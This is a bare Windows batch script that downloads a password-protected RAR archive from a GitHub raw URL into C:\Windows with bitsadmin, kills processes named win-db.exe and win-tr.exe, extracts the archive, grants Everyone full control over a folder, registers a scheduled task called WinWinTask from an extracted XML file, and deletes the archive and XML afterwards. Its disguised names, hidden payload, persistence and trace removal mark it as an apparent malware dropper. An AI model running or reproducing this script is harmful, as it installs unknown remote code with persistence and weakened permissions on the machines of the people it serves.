@echo off


set "RAR_NAME=programs1.rar"

set "URL=https://github.com/m-c00/tr/raw/main/"
set "OUTPUT_DIR=C:\Windows"
set "RAR_FILE=%OUTPUT_DIR%\%RAR_NAME%"
set "EXTRACTION_DIR=%OUTPUT_DIR%"
set "UNRAR_PATH=C:\Program Files\WinRAR\UnRAR.exe"
set "PASSWORD=m-c00"
set "TASK_XML=C:\Windows\programs\preflog\win-win.xml"
set "PERMISSION_DIR=C:\Windows\programs\preflog"
set "TASK_NAME=WinWinTask"


bitsadmin /transfer myDownload /download /priority normal "%URL%%RAR_NAME%" "%OUTPUT_DIR%\%RAR_NAME%"

timeout /t 10 >nul

tasklist | findstr /i "win-db.exe" >nul
if %errorlevel% equ 0 (
    taskkill /f /im "win-db.exe" >nul 2>&1
)

tasklist | findstr /i "win-tr.exe" >nul
if %errorlevel% equ 0 (
    taskkill /f /im "win-tr.exe" >nul 2>&1
)


"%UNRAR_PATH%" x -o+ -p%PASSWORD% "%RAR_FILE%" "%EXTRACTION_DIR%"

icacls "%PERMISSION_DIR%" /grant:r "*S-1-1-0:(OI)(CI)F" /t /c

schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1

schtasks /create /xml "%TASK_XML%" /tn "%TASK_NAME%"


del "%RAR_FILE%" >nul 2>&1


del "%TASK_XML%" >nul 2>&1

pause
